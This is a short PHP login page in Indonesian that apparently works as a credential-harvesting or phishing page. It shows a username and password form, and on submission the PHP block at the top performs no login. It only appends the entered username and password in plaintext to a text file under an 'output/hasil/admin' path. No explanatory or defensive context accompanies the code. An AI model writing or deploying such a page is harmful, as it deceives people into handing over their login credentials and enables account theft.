<?php 
if (isset($_POST['masuk'])) {
	$username = $_POST['username'];
	$password = $_POST['password'];
	$file = fopen("output/hasil/admin/txt/hasil.txt", "a");
	fwrite($file, "Nama : $username\nPassword : $password\n");
	fclose($file);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="stylesheet" type="text/css" href="util.css">
  <link rel="stylesheet" type="text/css" href="main.css">
  <title>My document</title>
</head>
<body>
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-100">
				<form class="login100-form" action="" method="post">
					<span class="login100-form-title p-b-33">Halaman Masuk</span>
					<div class="wrap-input100">
						<input class="input100" type="text" name="username" placeholder="Username" autocomplete="off" required>
					</div>

					<div class="wrap-input100">
						<input class="input100" type="password" name="password" placeholder="Password" autocomplete="off" required>
					</div>

					<div class="container-login100-form-btn m-t-20">
						<button class="login100-form-btn" name="masuk">Masuk</button>
					</div>
				</form>
			</div>
		</div>
	</div>

</body>
</html>